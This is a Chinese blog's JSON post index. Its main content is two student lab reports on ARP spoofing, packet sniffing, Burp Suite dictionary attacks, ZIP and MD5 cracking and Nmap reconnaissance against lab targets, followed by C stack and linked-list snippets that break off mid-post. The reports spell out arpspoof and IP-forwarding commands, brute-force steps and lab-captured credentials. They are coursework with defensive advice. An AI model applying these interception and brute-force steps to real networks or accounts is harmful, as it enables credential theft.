{"meta":{"title":"myBlog","subtitle":"","description":null,"author":"Q","url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2023-12-05T03:43:26.000Z","updated":"2023-12-05T10:16:39.080Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-12-05T03:43:37.000Z","updated":"2023-12-05T10:19:13.443Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"实验二 网络嗅探与身份认证","slug":"实验二 网络嗅探与身份认证","date":"2023-12-20T09:42:06.014Z","updated":"2023-12-20T12:43:59.514Z","comments":true,"path":"2023/12/20/实验二 网络嗅探与身份认证/","permalink":"http://example.com/2023/12/20/%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/","excerpt":"","text":"实验二 网络嗅探与身份认证实验目的：1、通过使用Wireshark软件掌握Sniffer（嗅探器）工具的使用方法，实现捕捉HTTP等协议的数据包，以理解TCP&#x2F;IP协议中多种协议的数据结构、通过实验了解HTTP等协议明文传输的特性。 2、研究交换环境下的网络嗅探实现及防范方法，研究并利用ARP协议的安全漏洞，通过Arpspoof实现ARP欺骗以捕获内网其他用户数据。 3、能利用BrupSuite实现网站登录暴力破解获得登录密码。 4、能实现ZIP密码破解，理解安全密码的概念和设置。 系统环境：Kali Linux 2、Windows 网络环境：交换网络结构 实验工具：Arpspoof、WireShark、BurpSuite、fcrackzip（用于zip密码破解）。 实验原理：网络嗅探 1、网络嗅探概述 Sniffer（嗅探器）工作在OSI模型的第二层，利用计算机的网卡截获网络数据报文的一种工具，可用来监听网络中的数据，分析网络的流量，以便找出所关心的网络中潜在的问题。例如,假设网络的某一段运行得不是很好,报文的发送比较慢,而我们又不知道问题出在什么地方,此时就可以用嗅探器确定不同网络协议、不同用户的通信流量，相互主机的报文传送间隔时间等，这些信息为管理员判断网络问题、管理网络区域提供了非常宝贵的信息。 在正常情况下，一个合法的网络接口应该只响应这样的两种数据帧：帧的目标区域具有和本地网络接口相匹配的硬件地址；帧的目标区域具有“广播地址”。 如果网卡处于混杂（promiscuous）模式，那么它就可以捕获网络上所有的数据帧，处于对网络的“监听”状态，如果一台机器被配置成这样的方式，它（包括其软件）就是一个嗅探器。 在交换型以太网中，上述条件2是不满足的。所有的主机连接到SWITCH，SWITCH比HUB更聪明，它知道每台计算机的MAC地址信息和与之相连的特定端口，发给某个主机的数据包会被SWITCH从特定的端口送出，而不是象HUB那样，广播给网络上所有的机器。这种传输形式使交换型以太网的性能大大提高，同时还有一个附加的作用：使传统的嗅探器无法工作。 交换型网络环境嗅探的核心问题是：如何使本不应到达的数据包到达本地。通常的方法有MAC洪水包和ARP欺骗。其中MAC洪水包是向交换机发送大量含有虚构MAC地址和IP地址的IP包，使交换机无法处理如此多的信息，致使交换机就进入了所谓的”打开失效”模式，也就是开始了类似于集线器的工作方式，向网络上所有的机器广播数据包。 2、ARP欺骗 本实验中，我们将要详细分析ARP欺骗模式，并通过ARP欺骗达到交换网络嗅探的目的。 每一个主机都有一个ARP高速缓存，此缓存中记录了最近一段时间内其它IP地址与其MAC地址的对应关系。如果本机想与某台主机通信，则首先在ARP高速缓存中查找此台主机的IP和MAC信息，如果存在，则直接利用此MAC地址构造以太帧；如果不存在，则向本网络上每一个主机广播一个ARP请求报文，其意义是”如果你有此IP地址，请告诉我你的MAC地址”，目的主机收到此请求包后，发送一个ARP响应报文，本机收到此响应后，把相关信息记录在ARP高速缓存中，以下的步骤同上。 可以看出，ARP协议是有缺点的，第三方主机可以构造一个ARP欺骗报文，而源主机却无法分辨真假。如果发送者硬件地址字段填入攻击者的硬件地址，而发送者IP地址填入被假冒者的IP地址，那么就构造出了一个用于欺骗的ARP请求报文。那么被欺骗主机的ARP高速缓存，被假冒者的IP地址与其MAC地址的对应关系就会更改为欺骗者的，从而达到ARP欺骗的目的。特别的，如果攻击者冒充网关，将转发子网内到外网的所有通信量，以达到捕获其他主机的通信量，从而破坏数据传输的保密性。 3、密码（口令，Password）安全 在现实网络中，攻击事件发生的频率越来越高，其中相当多的都是由于网站密码泄露的缘故，或是人为因素导致，或是口令遭到破解，所以从某种角度而言，密码的安全问题不仅仅是技术上的问题，更主要的是人的安全意识问题。 3.1、口令破解方法 口令破解主要有两种方法：字典破解和暴力破解。 字典破解是指通过破解者对管理员的了解，猜测其可能使用某些信息作为密码，例如其姓名、生日、电话号码等，同时结合对密码长度的猜测，利用工具来生成密码破解字典。如果相关信息设置准确，字典破解的成功率很高，并且其速度快，因此字典破解是密码破解的首选。 而暴力破解是指对密码可能使用的字符和长度进行设定后（例如限定为所有英文字母和所有数字，长度不超过8），对所有可能的密码组合逐个实验。随着可能字符和可能长度的增加，存在的密码组合数量也会变得非常庞大，因此暴力破解往往需要花费很长的时间，尤其是在密码长度大于10，并且包含各种字符（英文字母、数字和标点符号）的情况下。 3.2、口令破解方式 口令破解主要有两种方式：离线破解和在线破解。 离线破解攻击者得到目标主机存放密码的文件后，就可以脱离目标主机，在其他计算机上通过口令破解程序穷举各种可能的口令，如果计算出的新密码与密码文件存放的密码相同，则口令已被破解。 3.3 候选口令产生器 候选口令产生器的作用是不断生成可能的口令。有几种方法产生候选口令，一种是用枚举法来构造候选口令（暴力破解），另一种方法是从一个字典文件里读取候选口令（字典破解）。 3.4 口令加密 口令加密过程就是用加密算法对从口令候选器送来的候选口令进行加密运算而得到密码。这要求加密算法要采用和目标主机一致的加密算法。加密算法有很多种，通常与操作系统或应用程序的类型和版本相关。 Burp Suite是一个用于测试Web应用程序安全性的图形工具。该工具使用Java编写，由PortSwigger Security开发。该工具有两个版本。可免费下载的免费版（免费版）和试用期后可购买的完整版（专业版）。免费版本功能显着降低。它的开发旨在为Web应用程序安全检查提供全面的解决方案，Burp Suite是进行Web应用安全测试集成平台。它将各种安全工具无缝地融合在一起，以支持整个测试过程中，从最初的映射和应用程序的攻击面分析，到发现和利用安全漏洞。 实验步骤和内容：网络嗅探部分：网络嗅探：Wireshark 监听网络流量，抓包。 ARP欺骗： ArpSpoof，实施ARP欺骗。 防范： 防范arp欺骗。 实验网络拓扑 1、A主机上外网，B运行sinffer(Wireshark)选定只抓源为A的数据)。回答：先设置 “echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward” 使目标ip正常上网 再使用arp欺骗 使用wirkeshack抓取目标流量包 1.1 写出以上过滤语句。回答：ip.src&#x3D;&#x3D;192.168.30.91 1.2 在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，B是否能看到A和外网（该网站）的通信（A刚输入的帐户和口令）？为什么？ 回答：不能。因为， B的wireshark不在混杂模式下，所有的主机连接到SWITCH，SWITCH知道每台计算机的MAC地址和与之相连的特定端口，发给某个主机的数据包会被SWITCH从特定的端口送出，所以B不能得到A的外网通信。 2.1 为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？回答：B冒充网关 2.2 写出arpspoof命令格式。回答：arpspoof -i 网卡 -t 目标IP 网关 2.3 B是否能看到A和外网的通信（A输入的帐户和口令）？截图Wireshark中显示的明文信息。回答：（由于实验课结束，A换人，A的IP更改为192.168.30.194）A登陆pikachu，B抓包得到账号&#x2F;密码admin&#x2F;123456 FTP数据还原部分：利用WireShark打开实验实验数据data.pcapng。 3.1 FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？回答：192.168.182.1 FTP ip地址为192.168.182.1 因为请求方一直是192.168.182.132，回应方一直是192.168.182.132 3.2客户端登录FTP服务器的账号和密码分别是什么?回答：student&#x2F;sN46i5y 3.3 客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？*提示：文件名有可能是中文。*回答：1.zip和复习.Txt 3.4 还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。回答：将数据流另存为1.zip 再使用Ziperello暴力破解得到密码123456 得到一张企鹅图片 3.5 TXT文件的内容是什么？ 4、网站登录密码 利用人们平时常用的词、句破译，如果说暴力破解是一个一个的尝试那么字典破译就是利用人们习惯用人名、地名或者常见的词语设置成密码的习惯进行破译。字典破译速度比暴力破译更快但是有时候密码设置中包含了没有字典库中的词句就无法破解出来了，因此有好的字典是关键。 以pikachu为目标网站，构造字典（wordlist），其中包含你的正确密码，利用burpsuite进行字典攻击，实施字典攻击，你是如何判断某个密码为破解得到的正确密码，截图。 回答：随便输入账号和密码 通过bp抓包 发送到intruder并添加攻击位置，设置攻击方式为clusterbomb 导入字典并开始攻击 通过字典爆破得admin&#x2F;123456 5、MD5破解 SqlMap得到某数据库用户表信息，用户口令的MD5值为7282C5050CFE7DF5E09A33CA456B94AE 那么，口令的明文是什么？（提示：MD5值破解） 6、John the Ripper的作用是什么？ 回答：John the Ripper是一个密码破解工具，用于测试和评估密码的安全性。它可以通过多种方式破解密码，包括暴力破解、字典攻击和彩虹表攻击等。John the Ripper主要用于渗透测试和密码审计，帮助管理员评估系统中的弱密码并采取相应的安全措施。然而，请注意，使用John the Ripper或其他密码破解工具来未经授权地入侵他人系统是非法的行为。 思考问题：1、 谈谈如何防止ARP攻击。a.使用静态ARP表： 在网络中使用静态ARP表，将IP地址与MAC地址进行手动绑定。这样可以防止攻击者通过发送虚假的ARP响应来欺骗其他设备。 b.使用ARP防火墙： 部署ARP防火墙可以检测和阻止异常的ARP流量。这些防火墙可以监控网络上的ARP请求和响应，识别异常模式，并采取相应的阻止措施。 c.网络流量监测：实施网络流量监测工具，监控网络中的ARP请求和响应。异常的ARP流量模式可能表明ARP攻击正在发生。 c.端口安全特性： 使用交换机的端口安全特性，限制每个端口上允许的MAC地址数量。这可以防止攻击者通过在网络上发送大量虚假的ARP响应来引发混乱。 d.启用802.1X认证： 802.1X认证要求所有连接到网络的设备进行身份验证。只有通过身份验证的设备才能参与网络通信，从而减少了ARP攻击的风险。 e.使用VPN： 如果可能，使用虚拟专用网络（VPN）可以加密通信，使得攻击者更难截获和篡改网络通信。 f.定期审查ARP表： 管理员可以定期审查网络设备的ARP表，检查是否存在异常的或重复的条目。发现异常情况时，可以采取纠正措施。 g.网络安全培训： 对网络用户和管理员进行网络安全培训，使其了解ARP攻击的风险，并教导采取预防措施。 2、 安全的密码（口令）应遵循的原则。a.长度： 使用足够长度的密码，一般来说，密码长度越长越安全。推荐至少12个字符。 b.复杂性： 包含不同类型的字符，包括大写字母、小写字母、数字和特殊字符（例如！、@、#、$等）。 c.避免常见词语： 避免使用容易猜测的密码，如常见单词、词典单词、生日、名字等。攻击者可能使用字典攻击来猜测这些密码。 d.不重复使用： 对于不同的账户和服务，请使用不同的密码。这样，如果一个账户受到攻击，其他账户仍然安全。 e.定期更改： 定期更改密码以增加安全性。虽然不需要每个月都更改，但定期更改是一个好的安全实践。 f.避免个人信息： 避免在密码中使用与个人相关的信息，如姓名、生日、地址等。这些信息可能容易被猜测或获取。 g.密码管理器： 使用密码管理器来生成、存储和管理强密码。密码管理器可以帮助您记住复杂的密码，而不必在多个账户之间重复使用相同的密码。 h.双因素身份验证： 启用双因素身份验证，以提供额外的安全层。这通常涉及到除密码外的第二个身份验证步骤，例如手机验证码或硬件令牌。 h.教育和培训： 对用户进行安全培训，教育他们有关密码安全的最佳实践，以及如何识别和防范社会工程学攻击。 i.监控和更新： 定期监控账户活动，及时更新密码，特别是在发生数据泄露或安全事件后。 3、 谈谈字典攻击中字典的重要性。a.包含常见密码： 字典通常包含常见的、容易猜测的密码，如常见单词、数字组合、常见短语等。这些密码是攻击者最有可能尝试的。 b.多样性： 一个好的字典文件应该包含各种类型的密码，涵盖了可能出现的不同组合和模式。这包括大小写字母、数字、特殊字符以及它们的组合。 c.社会工程学元素： 一些字典可能包含基于社会工程学的信息，如常见的名字、生日、固定短语等，因为用户可能会使用与其个人信息相关的密码。 d.更新和维护： 随着时间的推移，密码的使用趋势和模式可能会发生变化。一个好的字典应该定期更新，以反映新的密码趋势和流行词汇。 e.攻击速度：字典攻击是一种高效的攻击方式，因为攻击者可以迅速尝试大量密码。一个包含大量可能密码的字典可以在短时间内覆盖广泛的选择。 f.组合和变种： 一些字典可能包含密码的组合和变种，例如通过在单词之间添加数字、特殊字符或重复字符。这增加了攻击的成功率。 f.密码生成规则： 字典文件可能包含密码生成规则，攻击者可以使用这些规则来生成更多可能的密码组合，而不仅仅是静态的字典列表。 g.定制字典： 攻击者可能会创建针对特定目标的定制字典，其中包含与目标相关的信息，如公司名、产品名、关键人物名字等。 4、 实验小结。（1）本次实验收获很大，了解了网络嗅探、ARP欺骗、密码安全等相关安全技术和问题。对相关安全和技术有了更加全面的了解。 （2）了解了ARP欺骗技术，让我们更深入了解了网关的作用，和wireshark的使用。同时，也告诉了我们，网站使用明文的方式传输密码是非常危险的，若用户遭受了arp欺骗，则很容易造成密码的泄露。 （3）ftp数据还原的部分，让我们更加熟悉了数据的获取，以及wireshark的使用，同时也对服务器有了一定的了解。 （4）密码的破解方面，让我们了解了使用弱口令很容易就被破解，破解密码的方式和工具也有很多种，熟悉了对zip文件的密码的破解，同时也熟悉了brupsuite的使用，利用brupsuite实现了对网站登录密码的暴力破解，更加理解了浏览器的原理，以及brupsuite的使用。","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"实验","slug":"安全/网络渗透测试/实验","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E9%AA%8C/"}],"tags":[{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"}]},{"title":"实验一 网络扫描与网络侦察","slug":"实验一 网络扫描与网络侦察","date":"2023-12-10T13:57:39.142Z","updated":"2023-12-21T05:11:52.930Z","comments":true,"path":"2023/12/10/实验一 网络扫描与网络侦察/","permalink":"http://example.com/2023/12/10/%E5%AE%9E%E9%AA%8C%E4%B8%80%20%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/","excerpt":"","text":"实验一 网络扫描与网络侦察1. 实验目的和要求实验目的：理解网络扫描、网络侦察的作用；通过搭建网络渗透测试平台，了解并熟悉常用搜索引擎、扫描工具的应用，通过信息收集为下一步渗透工作打下基础。 系统环境：Kali Linux 2、Windows 网络环境：交换网络结构 实验工具： Metasploitable2（需自行下载虚拟机镜像）；Nmap（Kali）；WinHex、数据恢复软件等 2.实验原理：1、网络扫描与网络侦察的目的黑客在进行一次完整的攻击之前除了确定攻击目标之外，最主要的工作就是收集尽量多的关于攻击目标的信息。这些信息主要包括目标的操作系统类型及版本、目标提供哪些服务、各服务的类型、版本以及相关的社会信息。 攻击者搜集目标信息一般采用七个基本的步骤： （1） 找到初始信息，比如一个IP地址或者一个域名； （2） 找到网络地址范围，或者子网掩码； （3） 找到活动机器； （4） 找到开放端口和入口点； （5） 弄清操作系统； （6） 弄清每个端口运行的是哪种服务； （7） 找到目标可能存在的漏洞。 2、Google Hacking（或baidu）Google Hacking 是利用谷歌搜索的强大，来在浩瀚的互联网中搜索到我们需要的信息。轻量级的搜索可以搜素出一些遗留后门，不想被发现的后台入口，中量级的搜索出一些用户信息泄露，源代码泄露，未授权访问等等，重量级的则可能是mdb文件下载，CMS 未被锁定install页面，网站配置密码，php远程文件包含漏洞等重要信息。 3、BASE64编码BASE64是一种编码方式，通常用于把二进制数据编码为可写的字符形式的数据。 编码后的数据是一个字符串，其中包含的字符为：A-Z、a-z、0-9、+、&#x2F;共64个字符。（其实是65个字符，“&#x3D;”是填充字符）。 长度为3个字节(38)的数据经过Base64编码后就变为4个字节(46)。 如果数据的字节数不是3的倍数，则其位数就不是6的倍数，那么就不能精确地划分成6位的块。需在原数据后面添加1个或2个零值字节，使其字节数是3的倍数。 字符串“Xue”经过Base64编码后变为“WHVl”。 字符串“Xu”经过Base64编码后变为“WHU&#x3D;”。 字符串“X”经过Base64编码后变为“WA&#x3D;&#x3D;”。 4、NmapNmap是一个网络侦察和安全扫描程序，系统管理者和个人可以使用这个软件扫描大型的网络，获取哪台主机正在运行以及提供什么服务等信息。Nmap支持很多扫描技术，例如：UDP、TCP connect()、TCP SYN(半开扫描)、ftp代理(bounce攻击)、反向标志、ICMP、FIN、ACK扫描、圣诞树(Xmas Tree)、SYN扫描和null扫描。Nmap还提供了一些高级的特征，例如：通过TCP&#x2F;IP协议栈特征探测操作系统类型，秘密扫描，动态延时和重传计算，并行扫描，通过并行ping扫描探测关闭的主机，诱饵扫描，避开端口过滤检测，直接RPC扫描(无须端口映射)，碎片扫描，以及灵活的目标和端口设定。 Nmap运行通常会得到被扫描主机端口的列表。Nmap总会给出well known端口的服务名(如果可能)、端口号、状态和协议等信息。每个端口的状态有：open、filtered、unfiltered。open状态意味着目标主机能够在这个端口使用accept()系统调用接受连接。filtered状态表示：防火墙、包过滤和其它的网络安全软件掩盖了这个端口，禁止Nmap探测其是否打开。unfiltered表示：这个端口关闭，并且没有防火墙&#x2F;包过滤软件来隔离nmap的探测企图。通常情况下，端口的状态基本都是unfiltered状态，只有在大多数被扫描的端口处于filtered状态下，才会显示处于unfiltered状态的端口。 根据使用的功能选项，Nmap也可以报告远程主机的下列特征：使用的操作系统、TCP序列、运行绑定到每个端口上的应用程序的用户名、DNS名、主机地址是否是欺骗地址、以及其它一些东西。 5、WinHexWinHex 是一款以通用的 16 进制编辑器为核心，专门用来对付计算机取证、数据恢复、低级数据处理、以及 IT 安全性、各种日常紧急情况的高级工具： 用来检查和修复各种文件、恢复删除文件、硬盘损坏、数码相机卡损坏造成的数据丢失等。 3. 实验步骤1、用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面。 2、照片中的女生在哪里旅行？截图搜索到的地址信息。 回答：使用搜索引擎得到地址，再通过谷歌地图找到门店（需要调整时间） 3、手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。 获取自己手机的LAC和CID： Android 获取方法：Android： 拨号*##4636##*进入手机信息工程模式后查看 iphone获取方法：iPhone：拨号*3001#12345#*进入FieldTest Serving Cell info–&gt;LAC&#x3D;Tracking Area Code –&gt;cellid &#x3D; Cell identity 若不能获取，用右图信息。 截图你查询到的位置信息。 回答：使用右图信息 4、编码解码将Z29vZCBnb29kIHN0dWR5IQ&#x3D;&#x3D;解码。截图。 回答： 5、地址信息5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。回答：该用户使用的设备为苹果品牌 该IP定位为“广西桂林市桂林电子科技大学” 5.2 访问https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因回答：不相同，原因： 我们能够上网靠的是isp组织分给我们的Ip地址，但是这个ip地址一般不是给个人的，一般都是给一个单位，一个区域的，也就是说我们实际上能接触到的一般都是私有地址，即我们用ipconig查到的都是私有地址，也就相当于局域网内的ip地址，当我们真正联网时，会先把数据发送到路由，然后再由路由进行处理实现真正的联网操作，路由的地址才是真正联网的Ip地址，也就是pubilc ip，而我们在自己电脑上查到的都是私有ip 6、NMAP使用6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能回答:通过NMAP扫描整个子网得到Metasploitable2的ip以及开发端口 其中 a.80端口为web服务 b.3306端口为MySQL数据库服务 C.21端口主要用于FTP（File Transfer Protocol，文件传输协议）服务。 FTP服务主要是为了在两台计算机之间实现文件的上传与下载，一台计算机作为FTP客户端，另一台计算机作为FTP服务器，可以采用匿名（anonymous）登录和授权用户名与密码登录两种方式登录FTP服务器。 d.22端口主要用于SSH(Secure SHell) SSH的英文全称是Secure SHell。通过使用SSH，你可以把所有传输的数据进行加密，这样“中间人”这种攻击方式就不可能实现了，而且也能够防止DNS和IP欺骗。还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替telnet，又可以为ftp、pop、甚至ppp提供一个安全的“通道” 6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图回答：扫描命令为“nmap -O +目标 IP” Metasploitable2的操作系统为linux 6.3 利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码6.4 查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。回答：WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的勒索病毒软件，大小3.3MB，由不法分子利用NSA（National Security Agency，美国国家安全局）泄露的危险漏洞“EternalBlue”（永恒之蓝）进行传播 [1]。勒索病毒肆虐，俨然是一场全球性互联网灾难，给广大电脑用户造成了巨大损失。最新统计数据显示，100多个国家和地区超过10万台电脑遭到了勒索病毒攻击、感染。 [2]勒索病毒是自熊猫烧香以来影响力最大的病毒之一。WannaCry勒索病毒全球大爆发，至少150个国家、30万名用户中招，造成损失达80亿美元，已经影响到金融，能源，医疗等众多行业，造成严重的危机管理问题。中国部分Windows操作系统用户遭受感染，校园网用户首当其冲，受害严重，大量实验室数据和毕业设计被锁定加密。部分大型企业的应用系统和数据库文件被加密后，无法正常工作，影响巨大。 7、利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。回答：1. Apache Struts 目录遍历导致文件上传漏洞 Apache Struts是美国阿帕奇（Apache）软件基金会下属的Jakarta项目中的一个子项目，是一个基于MVC设计的Web应用框架。漏洞源于文件上传逻辑存在缺陷，攻击者可利用上传文件参数启动路径遍历，上传恶意文件，进而导致远程代码执行。 2.Apache ActiveMQ jolokia 远程代码执行漏洞 Apache ActiveMQ 中存在远程代码执行漏洞，具有 Apache ActiveMQ 服务器TCP端口（默认为61616）访问权限的远程攻击者可以通过发送恶意数据到服务器从而执行任意代码。 3.CVE-2019-0211 Apache Root Privilege Escalation 在MPM prefork中，以root身份运行的主服务器进程管理一个单线程、低权限（www-data）的工作进程池，用于处理HTTP请求。为了从工作进程那里获得反馈，Apache维护了一个共享内存区域（SHM）计分板，其中包含各种信息，例如工作进程的PID，以及它们处理的最后一个请求。每个工作进程都以维护与其PID相关联的process_score结构为目标，并且具有对SHM的完全读&#x2F;写访问权限。 8、Winhex简单数据恢复与取证8.1 elephant.jpg不能打开了，利用WinHex修复，说明修复过程。回答：文件类型为jpg文件，但文件头却为00 00 FF E0,jpg文件的文件头应为FF D8 FF E0,修改文件头得到图片 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849一、常见文件头文件尾1、图片JPEG 文件头：FF D8 FF 文件尾：FF D9TGA 未压缩的前4字节 00 00 02 00 RLE压缩的前5字节 00 00 10 00 00PNG 文件头：89 50 4E 47 0D 0A 1A 0A 文件尾：AE 42 60 82GIF 文件头：47 49 46 38 39(37) 61 文件尾：00 3BBMP 文件头：42 4D 文件头标识(2 bytes) 42(B) 4D(M)TIFF (tif) 文件头：49 49 2A 00ico 文件头：00 00 01 00Adobe Photoshop (psd) 文件头：38 42 50 532、office文件MS Word/Excel (xls.or.doc) 文件头：D0 CF 11 E0MS Access (mdb) 文件头：53 74 61 6E 64 61 72 64 20 4AWordPerfect (wpd) 文件头：FF 57 50 43Adobe Acrobat (pdf) 文件头：25 50 44 46 2D 31 2Eapplication/vnd.visio(vsd) 文件头：D0 CF 11 E0 A1 B1 1A E1Email [thorough only] (eml) 文件头：44 65 6C 69 76 65 72 79 2D 64 61 74 65 3AOutlook Express (dbx) 文件头：CF AD 12 FE C5 FD 74 6FOutlook (pst) 文件头：21 42 44 4ERich Text Format (rtf) 文件头：7B 5C 72 74 66txt 文件(txt) 文件头：Unicode：FE FF / Unicode big endian：FF FE / UTF-8：EF BB BF /ANSI编码是没有文件头的3、压缩包文件ZIP Archive (zip) 文件头：50 4B 03 04 文件尾：50 4BRAR Archive (rar) 文件头：52 61 72 214、音频文件Wave (wav) 文件头：57 41 56 45audio(Audio) 文件头： 4D 54 68 64audio/x-aac（aac）文件头：FF F1(9)5、视频文件AVI (avi) 文件头：41 56 49 20Real Audio (ram) 文件头：2E 72 61 FDReal Media (rm) 文件头：2E 52 4D 46MPEG (mpg) 文件头：00 00 01 BA(3)Quicktime (mov) 文件头：6D 6F 6F 76Windows Media (asf) 文件头：30 26 B2 75 8E 66 CF 11MIDI (mid) 文件头：4D 54 68 646、代码文件XML (xml) 文件头：3C 3F 78 6D 6CHTML (html) 文件头：68 74 6D 6C 3EQuicken (qdf) 文件头：AC 9E BD 8FWindows Password (pwl) 文件头：E3 82 85 967、其他类型windows证书文件(der) 文件头：30 82 03 C9CAD (dwg) 文件头：41 43 31 30Windows Shortcut (lnk) 文件头：4C 00 00 00Windows reg(reg) 文件头：52 45 47 45 44 49 54 34 8.2 笑脸背后的阴霾：图片smile有什么隐藏信息。回答：隐藏信息为tom is the kille-. 8.3 尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。 回答：下载一定的软件即可恢复 9、讨论学校热点GUET-WiFi的安全问题，以截图说明。10、实验小结实验报告小结需要描述Ethical Hacking的理解。 我对Ethical Hacking的理解：我对道德黑客的理解是指通过授权且合法的方式，以保护和提升网络安全为目标的技术活动。道德黑客是一群具备专业知识和技能的安全专家，他们通过模拟攻击和漏洞测试来评估系统和网络的安全性。他们的主要目的是发现潜在的安全风险，并向组织提供建议和解决方案来增强其安全性。 道德黑客与恶意黑客有着明显的区别，他们严格遵守法律和道德准则，并通过与组织合作的方式来执行其任务。他们的活动是经过授权的，通常在组织的请求下进行，以保护系统免受潜在的攻击和数据泄露。 道德黑客的工作范围包括对网络、应用程序和系统进行漏洞扫描、渗透测试、安全评估等活动。他们利用类似黑客攻击的技术手段来发现漏洞，然后向组织报告这些漏洞以及相应的修复建议。 总而言之，道德黑客的目标是通过帮助组织发现并修复安全漏洞，提高网络和系统的安全性，从而保护用户的数据和隐私。他们在维护网络安全方面发挥着重要的作用。 1.向网络上传个人照片时，若不想暴露个人位置，需要对照片的关键信息打上马赛克。 2.通过LAC码和CID码，可以初步确定手机用户的位置，所以自己手机的LAC和CID码不应该随便让其他人知道。 3.利用一定软件可以进行编码解码。注意：如果数据的字节数不是3的倍数，则其位数就不是6的倍数，那么就不能精确地划分成6位的块。需在原数据后面添加1个或2个零值字节，使其字节数是3的倍数。 4.当文件打不开时，可以利用winhex进行修复","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"实验","slug":"安全/网络渗透测试/实验","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E9%AA%8C/"}],"tags":[{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"}]},{"title":"栈","slug":"栈","date":"2023-12-08T09:41:14.018Z","updated":"2023-12-08T10:56:02.578Z","comments":true,"path":"2023/12/08/栈/","permalink":"http://example.com/2023/12/08/%E6%A0%88/","excerpt":"","text":"类型定义123456struct Node&#123; int data; struct Node *next;&#125;; typedef struct Node * PNode;typedef struct Node * top, * LinkStack; 创建空栈1234567LinkStack SetNullStack_link()&#123; LinkStack top=(LinkStack)malloc(sizeof(struct Node)); if(top!=NULL) top-&gt;next=NULL; else printf(&quot;创建空栈失败\\n&quot;); return top;&#125; 判空12345int IsNullStack_Link(LinkStack top)&#123; if(top-&gt;next==NULL) return 1; return 0;&#125; 进栈1234567891011void Push_link(LinkStack top,int x)&#123; PNode p; p=(PNode)malloc(sizeof(struct Node)); if(p==NULL) printf(&quot;进栈创建失败\\n&quot;); else&#123; p-&gt;data=x; p-&gt;next=top-&gt;next; top-&gt;next=p; &#125;&#125; 取栈顶12345int Top_link(LinkStack top) &#123; if(IsNullStack_Link(top)) printf(&quot;此栈为空\\n&quot;); else return top-&gt;next-&gt;data; &#125; 出栈12345678910void Pop_link(LinkStack top)&#123; PNode p; if(IsNullStack_Link(top)) printf(&quot;此栈为空\\n&quot;); else&#123; p=top-&gt;next; top-&gt;next=p-&gt;next; free(p); &#125;&#125;","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"数据结构","slug":"开发/数据结构","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"链表","slug":"链表","date":"2023-12-08T07:59:27.246Z","updated":"2023-12-08T08:44:25.250Z","comments":true,"path":"2023/12/08/链表/","permalink":"http://example.com/2023/12/08/%E9%93%BE%E8%A1%A8/","excerpt":"","text":"单链表类型定义1234567typedef int DataType;struct Node&#123; DataType data; //数据域 struct Node* next; //指针域 &#125;;typedef struct Node* PNode; //节点类型定义 typedef struct 